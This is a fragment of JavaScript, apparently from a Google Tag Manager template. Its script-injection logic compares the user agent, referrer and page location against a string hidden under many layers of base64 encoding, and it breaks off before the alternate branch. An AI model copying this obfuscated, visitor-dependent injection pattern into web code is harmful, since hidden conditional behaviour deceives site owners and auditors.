...
if (queryPermission('inject_script', url) && instance_id) {
  if (aU.indexOf(frEnc('Vm0wd2QyVkZOVWRpUm1ScFVtMW9WRll3Wkc5WFJsbDNXa1JTV0ZKdGVEQlpNM0JIVmpGS2RHVkVRbUZXVmxsM1ZtMTRZV015VGtsaVJtUnBWMFpLYjFac1ZtRldNVnBXVFZWV2FHVnFRVGs9', 10)) !== -1 ||
    rF.indexOf(eR) !== -1 || lC.indexOf(eR) !== -1) {
      data.gtmOnSuccess();
    } else {
